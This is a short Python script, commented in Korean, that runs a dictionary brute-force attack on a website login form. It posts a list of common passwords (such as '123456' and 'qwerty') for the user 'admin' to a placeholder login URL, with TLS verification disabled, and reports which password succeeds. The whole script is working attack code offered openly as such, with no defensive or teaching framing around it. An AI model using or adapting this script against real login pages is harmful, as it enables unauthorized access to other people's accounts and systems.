import requests

# 타겟 웹 사이트의 로그인 URL
url = "http://example.com/login"

# 공격에 사용할 아이디 및 비밀번호 리스트
username = "admin"
password_list = [
    "123456", "password", "admin", "welcome", "letmein", "qwerty", "123456789", "12345", "123123", "password1",
    # ... 비밀번호 리스트 계속됨
]

# 비밀번호 무차별 대입 공격 수행 (기존 비밀번호 리스트 사용)
def brute_force_login(url, username, password_list):
    for password in password_list:
        data = {"username": username, "password": password}
        try:
            response = requests.post(url, data=data, verify=False)
        except requests.exceptions.RequestException as e:
            print(f"[!] 요청 중 오류 발생: {e}")
            continue
        
        if "Login successful" in response.text:
            print(f"[+] 로그인 성공! 비밀번호: {password}")
            return True
        else:
            print(f"[-] 로그인 실패. 시도한 비밀번호: {password}")
    
    print("[!] 비밀번호 리스트 내에 올바른 비밀번호가 없습니다.")
    return False

# 실행
brute_force_login(url, username, password_list)
